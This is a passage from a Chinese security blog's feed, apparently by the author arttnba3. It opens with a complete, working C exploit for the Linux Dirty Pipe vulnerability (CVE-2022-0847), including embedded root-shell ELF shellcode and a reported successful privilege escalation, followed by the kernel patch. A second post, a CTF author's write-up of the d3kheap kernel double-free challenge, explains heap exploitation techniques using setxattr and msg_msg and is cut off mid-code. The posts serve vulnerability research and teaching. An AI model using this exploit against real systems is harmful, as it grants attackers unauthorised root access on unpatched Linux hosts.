class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * exploit of CVE-2022-0847</span></span><br><span class="line"><span class="comment"> * written by arttnba3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> shellcode_len = <span class="number">149</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span>page_size;</span><br><span class="line"><span class="type">size_t</span>offset_in_file;</span><br><span class="line"><span class="type">size_t</span> data_size;</span><br><span class="line"><span class="type">int</span> target_file_fd;</span><br><span class="line"><span class="type">int</span>pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> pipe_size;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checking before we start to exploit</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">offset_in_file = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit now...</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment"> * Just write and read through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment"> * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment"> * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">offset_in_file--;<span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment"> * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment"> * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = write(pipe_fd[<span class="number">1</span>], &amp;shellcode[<span class="number">1</span>], shellcode_len);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; shellcode_len)</span><br><span class="line">errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Trigger root shell...\033[0m&quot;</span>);</span><br><span class="line">system(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Ubuntu 21.10 、内核版本 <code>5.13.0-28</code>  上测试的结果如下，成功完成提权：</p><p><img src="https://s2.loli.net/2022/03/12/P2QdeIqbASfuxHR.png" alt="image.png"></p><h1 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04.漏洞修复"></a>0x04.漏洞修复</h1><p>漏洞的修复方式比较简单，只需要在对应的涉及到 <code>pipe_buffer-&gt;flags</code> 的代码添加上将 flag 置 0 的代码即可，除了 <code>copy_page_to_iter_pipe</code> 以外在 <code>push_pipe</code> 中也缺失了置 0 的代码，补充上即可：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/lib/iov_iter.c b/lib/iov_iter.c</span></span><br><span class="line"><span class="comment">index b0e0acdf96c1..6dd5330f7a99 100644</span></span><br><span class="line"><span class="comment">--- a/lib/iov_iter.c</span></span><br><span class="line"><span class="comment">+++ b/lib/iov_iter.c</span></span><br><span class="line"><span class="meta">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by</span><br><span class="line"> return 0;</span><br><span class="line"> </span><br><span class="line"> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line"><span class="addition">+buf-&gt;flags = 0;</span></span><br><span class="line"> get_page(page);</span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = offset;</span><br><span class="line"><span class="meta">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,</span><br><span class="line"> break;</span><br><span class="line"> </span><br><span class="line"> buf-&gt;ops = &amp;default_pipe_buf_ops;</span><br><span class="line"><span class="addition">+buf-&gt;flags = 0;</span></span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = 0;</span><br><span class="line"> buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);</span><br></pre></td></tr></table></figure><blockquote><p>参见<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">linux-kernel.vger.kernel.org archive mirror</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我超，管人痴！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记</title>
    <link href="http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/"/>
    <id>http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</id>
    <published>2022-03-08T10:25:07.000Z</published>
    <updated>2022-05-16T21:46:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>听说 sb 出题人把 exp 也给打包发布了，比赛结束才发现</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本题的原型来自于笔者大三上学期面试国内某安全大厂时的一道面试题，当时的问题是：</p><ul><li>“在保护全开的情况下若是给你一个内核空间中的 double free，大小为███，你该怎样去利用？”</li></ul><p>笔者在当时并未答出一个令面试官较为满意的答案，之后笔者重新思考，发现这是一个<strong>十分有意思</strong>的问题：这十分贴近于现实内核漏洞的抽象模型之一。</p><p>相比于 CTF 中 pwn 题所给予的“优越”的环境，现实中的漏洞往往就<strong>只是</strong>一个引用计数错误导致的 double free、一个溢出（可能只是一个 <code>\0</code> 字节）、一个垂悬指针导致的 UAF…在这种漏洞环境当中，我们并没有“出题人”给予我们的“菜单堆”的各种功能</p><p>因此，在这样“恶劣”的漏洞环境之下，我们不能仅仅寄希望于这个漏洞有一个较好的品相、既能帮我们泄露内核基址又能帮我们劫持控制流，而应当更多地<strong>借助内核本身提供给我们的工具</strong>，以寻求更为<strong>通用</strong>的解法</p><p>如何寻求更为通用的解法？大家都知道对于用户态的 glibc 堆题而言我们往往有着一种通用解法——将漏洞转为 UAF。无论是 overlapping 、double free、overflow…最终我们都可以通过将其转化为 UAF 完成利用，这个法则对于“内核堆”而言同样有效</p><p>基于这种思想，对于内核中的 double free、堆溢出等漏洞，我们都可以想方法将其化为 UAF，之后再通过通用的解法完成解题——<strong>本题便是笔者对于在内核漏洞利用的 UAF 阶段之后通用的解法的一个探索与尝试</strong></p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>笔者在 README.md 中额外说明了内核的如下编译选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>即除了 FG-KASLR 以外大部分主流的保护都开启了</p><p>因为笔者更希望大家能够关注于漏洞利用上，因此题目本身的逻辑十分简单，只提供了一个 ioctl “菜单”，<strong>有效的功能只有分配与释放 buf</strong>，分配的大小为 1024</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">d3kheap_ioctl</span><span class="params">(<span class="keyword">struct</span> file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">    spin_lock(&amp;spin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> OBJ_ADD:</span><br><span class="line">                <span class="keyword">if</span> (buf)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] You already had a buffer!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                buf = kmalloc(<span class="number">1024</span>, GFP_KERNEL);</span><br><span class="line">                ref_count++;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[d3kheap:] Alloc done.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_EDIT:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_SHOW:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_DEL:</span><br><span class="line">                <span class="keyword">if</span> (!buf)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] You don\&#x27;t had a buffer!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!ref_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] The buf already free!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ref_count--;</span><br><span class="line">                kfree(buf);</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[d3kheap:] Free done.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Invalid instructions.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;spin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>涉及到的两个全局变量初始值如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ref_count = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>根据 ioctl 的逻辑，当我们分配了一个 object 之后 <strong>ioctl 的分配功能就无效了</strong>，而每当我们进行一次释放，<code>ref_count</code> 便会减一，当其为 0 时 <strong>ioctl 的释放功能也被无效化</strong></p><p>漏洞点很明显，对 <code>ref_count</code> 的错误初始化导致我们可以释放 buf 两次，即该模块<strong>只提供给你三次操作机会，一次分配，两次释放，我们不能通过漏洞模块对 buf 进行任何额外的操作</strong>（例如读&#x2F;写），本质上就是——“给你一次内核空间中大小为 1024 的 object 的 double free 的机会，保护全开，你该如何去利用？”</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>因为在 slub_free 中有着对 double free 的简单检查（类似于 glibc 中的 fastbin，会检查 freelist 指向的第一个 object），因此我们不能够直接进行 double free，而应该将其转化为 UAF 进行利用</p><h2 id="构造-UAF"><a href="#构造-UAF" class="headerlink" title="构造 UAF"></a>构造 UAF</h2><p>我们首先需要构造一个 UAF，我们不难想到如下利用链：</p><ul><li>分配一个 1024 大小的 object</li><li>释放该 object</li><li>将其分配到别的结构体（victim）上</li><li>释放该 object</li></ul><p>此时 victim 虽然还处在使用阶段，但是<strong>在 slub 中其同时也被视为一个 free object</strong>，我们此时便完成了 UAF 的构造，由于 slub 遵循 LIFO，因此接下来分配的第一个大小为 1024 的 object <strong>便会是 victim</strong></p><p>接下来有两种解法，一种是笔者最初想到的比较笨重的内存搜索解法，另一种是基于 Google 在 CVE-2021-22555 中给出的通用 UAF 解法</p><h2 id="解法一：利用-setxattr-多次劫持-msg-msg"><a href="#解法一：利用-setxattr-多次劫持-msg-msg" class="headerlink" title="解法一：利用 setxattr 多次劫持 msg_msg"></a>解法一：利用 setxattr 多次劫持 msg_msg</h2><h3 id="Step-I-setxattr-修改-object-内容"><a href="#Step-I-setxattr-修改-object-内容" class="headerlink" title="Step.I setxattr 修改 object 内容"></a>Step.I setxattr 修改 object 内容</h3><p>接下来我们思考如何对一个 free 状态的 object 内写入数据，这里笔者要向大家介绍一个名为 setxattr 的系统调用（对内核安全稍有研究的同学应该都接触过）</p><p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong>，完成写入之后该 object 又会通过 kvfree 被释放掉，因此我们便可以通过 setxattr <strong>多次修改 victim 的内容</strong></p><p>不够完美的一点是，slub 中 free 的 object 同样是连接成一个单向链表，因此我们无法控制该 object 中 <code>kmem_cache-&gt;offset</code> 偏移处的 8 字节的内容，但这个 offset 的存在<strong>也从另一个侧面提供给了我们便利</strong>，在接下来的利用中你会看到这一点</p><p>可能有的人还会想到 userfaultfd + setxattr 这一技术，或许可以利用这个技术劫持 freelist 完成任意地址分配与任意地址写？但是<strong>自从内核版本 5.11 起，userfaultfd 被限制为默认情况下只有 root 权限才能使用</strong>，因此这条路暂时是走不通的，我们接下来要找一个不是特别受分配大小影响的结构体</p><h3 id="Step-II-msg-msg-搜索内存完成地址泄露"><a href="#Step-II-msg-msg-搜索内存完成地址泄露" class="headerlink" title="Step.II msg_msg 搜索内存完成地址泄露"></a>Step.II msg_msg 搜索内存完成地址泄露</h3><p>现在我们有了「写的原语」，接下来我们要寻找「读的原语」，在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 